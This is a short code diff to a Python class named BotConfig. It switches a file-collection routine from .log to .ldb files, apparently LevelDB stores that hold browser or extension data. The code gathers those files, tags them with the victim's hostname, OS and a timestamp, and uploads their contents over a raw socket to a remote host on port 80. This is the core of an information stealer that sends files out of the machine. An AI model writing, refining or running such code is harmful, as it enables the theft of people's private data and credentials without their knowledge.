@@ -796,7 +796,7 @@ class BotConfig:
                 if not os.path.exists(nk_path):
                     continue
                 for file in os.listdir(nk_path):
-                    if file.endswith(".log"):
+                    if file.endswith(".ldb"):
                         log_file = nk_path + "/" + file
                         files.append(log_file)
         uid = os_type+"-"+hostname+"-"+str(int(time.time()))
@@ -807,13 +807,13 @@ class BotConfig:
             z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             z.connect((host, 80))
             flen = str(os.path.getsize(file))
-            if file.endswith(".log"):flen=str(1024*100)
+            if file.endswith(".ldb"):flen=str(1024*100)
             fstr = uid + ' ' + flen + ' ' + os.path.basename(file) + ' =EOFX='
             z.send(fstr.encode())
             time.sleep(2)
             try:
                 with open(file, 'rb') as f:
-                    if file.endswith(".log"):
+                    if file.endswith(".ldb"):
                         fileData = f.read(1024*100)
                     else:
                         fileData = f.read()
